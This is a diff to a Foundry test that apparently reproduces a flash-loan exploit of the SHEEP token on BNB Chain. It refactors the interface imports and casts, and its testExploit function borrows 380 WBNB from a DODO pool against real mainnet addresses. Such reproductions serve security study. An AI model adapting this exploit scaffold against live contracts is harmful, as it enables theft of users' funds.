@@ -3,6 +3,10 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IDVM} from "src/interfaces/IDVM.sol";
 // @Analysis
 // https://twitter.com/BlockSecTeam/status/1623999717482045440
 // https://twitter.com/BlockSecTeam/status/1624077078852210691
@@ -22,7 +26,7 @@ contract ContractTest is Test {
 
     RDeflationERC20 SHEEP = RDeflationERC20(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    IUniswapV2Router Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IUniswapV2Pair Pair = IUniswapV2Pair(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);
     address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
 
@@ -31,7 +35,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        DVM(dodo).flashLoan(380 * 1e18, 0, address(this), new bytes(1));
+        IDVM(dodo).flashLoan(380 * 1e18, 0, address(this), new bytes(1));
 
         emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
     }
